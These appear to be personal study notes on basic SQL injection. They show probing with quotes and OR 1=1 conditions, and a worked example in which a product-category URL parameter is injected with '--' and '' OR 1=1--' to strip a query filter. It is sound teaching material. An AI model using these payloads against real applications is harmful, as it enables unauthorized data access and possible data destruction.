# sqli basics

> use the single quote character `'` and look for errors or other anomalies

> use boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses

> use them within:

In `UPDATE` statements, within the updated values or the `WHERE` clause.

In `INSERT` statements, within the inserted values.

In `SELECT` statements, within the table or column name.

In `SELECT` statements, within the `ORDER BY` clause.

In `SELECT` statements, within the `WHERE` clause.

## example

> if

- `https://insecure-website.com/products?category=Gifts` ->

- `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

> the use of `'--` will comment the rest of the query

- `https://insecure-website.com/products?category=Gifts'--` ->

- `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

the query no longer includes `AND released = 1` it is commented out

> the use of `' OR 1=1--` where `1=1` is always true, the query returns all items (in url use + instead of space)

- `https://insecure-website.com/products?category=Gifts'+OR+1=1--`

- `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

with `OR 1=1` the `UPDATE` or `DELETE` statement can result in an accidental loss of data tho
